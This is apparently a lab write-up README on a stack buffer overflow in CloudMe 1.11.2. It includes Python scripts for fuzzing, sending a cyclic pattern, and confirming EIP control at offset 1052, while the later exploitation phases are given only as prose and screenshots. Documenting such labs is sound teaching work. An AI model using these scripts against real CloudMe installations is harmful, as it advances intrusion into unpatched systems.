# Buffer-Overflow-Lab-CloudMe-1.11.2
Hands-on cybersecurity lab focused on buffer overflow analysis and exploitation in a controlled environment.

## Overview

This repository documents a hands-on cybersecurity laboratory focused on understanding and analyzing a classic Buffer Overflow vulnerability in a controlled and isolated environment.

The objective of this lab was to learn the methodology used to identify, analyze, and validate a stack-based buffer overflow vulnerability using debugging and reverse engineering techniques.

> This project was conducted exclusively for educational purposes in a virtualized laboratory environment.

---

## Learning Objectives

- Understand the fundamentals of stack-based buffer overflows.
- Perform vulnerability analysis in a controlled environment.
- Learn how memory corruption affects program execution.
- Gain experience using debugging tools.
- Understand exploit development methodology.
- Study common mitigation techniques.

---

## Lab Environment

| Component | Version |
|------------|-----------|
| Victim System | Windows 10 x86 |
| Attacker System | Kali Linux x64 |
| Vulnerable Application | CloudMe 1.11.2 |
| Debugger | Immunity Debugger |
| Analysis Plugin | mona.py |
| Scripting Language | Python |
| Virtualization | Virtual Machine |

---

## Using Immunity Debugger

A virtualized laboratory environment was configured to safely perform the analysis. The target application, CloudMe v1.11.2, was deployed on a Windows 10 virtual machine, while the analysis and testing activities were conducted from a separate Kali Linux system.

Immunity Debugger and Mona.py were used to monitor the application's behavior during the different stages of the assessment and to inspect memory structures when crashes occurred.

- To begin the analysis, Immunity Debugger was launched on the target Windows machine. The CloudMe process was then attached by navigating to **File → Attach** and selecting the running CloudMe process from the available list.

- Once attached, the application could be monitored in real time, allowing inspection of memory regions, processor registers, loaded modules, and execution flow.

- During fuzzing and subsequent testing phases, Immunity Debugger automatically paused execution whenever the application crashed, making it possible to investigate the cause of the memory corruption.

- To resume program execution after attaching to the process, the **Run** button (play icon) located in the toolbar was used.

- Since the application terminated after each crash, CloudMe was restarted and reattached to Immunity Debugger before continuing with additional tests.

- Particular attention was given to the CPU window, where the processor registers are displayed. The **EIP (Extended Instruction Pointer)** register was monitored to verify control over program execution, while the **ESP (Extended Stack Pointer)** register was analyzed to understand stack behavior during the different stages of the assessment.

![Environment Setup](images/Picture1.png)

---

## Methodology

### Phase 1: Fuzzing and Crash Identification

A fuzzing process was performed by sending progressively larger inputs to the application. The purpose of this phase was to observe how the service handled unexpected or oversized data and determine whether memory corruption conditions could be triggered.

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

size = 100

while size < 3000:

    print("\n[+] Sending {} bytes".format(size))

    raw_input("[*] Press Enter to continue...")

    try:
        payload = "A" * size

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((TARGET_IP, TARGET_PORT))
        client.send(payload)
        client.close()

        size += 100

    except:
        print("[!] Crash around {} bytes".format(size))
        break

```

![Attaching Process](images/1_immunityAttach.png)

After multiple iterations, the application crashed when processing an oversized input, indicating the presence of a potential buffer overflow vulnerability. The debugger confirmed that critical memory structures were being affected during the crash.

![Fuzzing Process](images/1_crash1200.png)

#### Evidence

![Fuzzing Result](images/1_errorMessage.png)

---

### Phase 2: Offset Calculation

Once the crash was reproduced consistently, a unique cyclic pattern was used to determine the exact location within memory where execution flow could be influenced.

This process allowed precise identification of the offset required to reach the instruction pointer, an essential step for understanding the impact of the vulnerability and validating exploitability.

![Pattern Created](images/2_patternCreate.png)

_Cyclic Pattern Created_

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

pattern_created = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(pattern_created)
client.close()

print("-> Pattern was send succesfully, check the EIP in Immunity")
```

![Pattern Created](images/2_eipCapture.png)

_EIP Captured_

#### Evidence

![Offset Found](images/2_offsetExact.png)

_Exact Offset Found at 1052_

---

### Phase 3: EIP Control Verification

The calculated offset was validated through controlled testing to confirm that the application's execution flow could be influenced as expected.

The objective of this stage was not to execute arbitrary code but rather to verify that the memory analysis performed in previous phases was accurate and reproducible.

```Python
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888

EXACT_OFFSET = 1052

fuzz = "A" * EXACT_OFFSET
fuzz += "BBBB"
fuzz += "C" * 500

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((TARGET_IP, TARGET_PORT))
client.send(fuzz)
client.close()

print("-> Fuzz was send succesfully, check the EIP, should be 42424242")
```

#### Evidence

![EIP Control](images/3_memoryControl.png)

---

### Phase 5: Bad Character Analysis

Input validation testing was conducted to identify characters that could interfere with payload execution.

#### Objectives

- Identify problematic bytes.
- Build a valid character set.

#### Evidence

![Bad Characters Analysis](images/badchars.png)

---

### Phase 6: Memory Analysis

A suitable instruction sequence was located within the process memory to redirect execution flow.

#### Objectives

- Analyze loaded modules.
- Locate executable memory regions.
- Understand control flow redirection.

#### Evidence

![Memory Analysis](images/memory-analysis.png)

---

### Phase 7: Final Validation

The laboratory concluded with the validation of the complete vulnerability analysis process in the controlled environment.

#### Objectives

- Verify reproducibility.
- Confirm understanding of exploitation workflow.

#### Evidence

![Final Validation](images/final-validation.png)

---
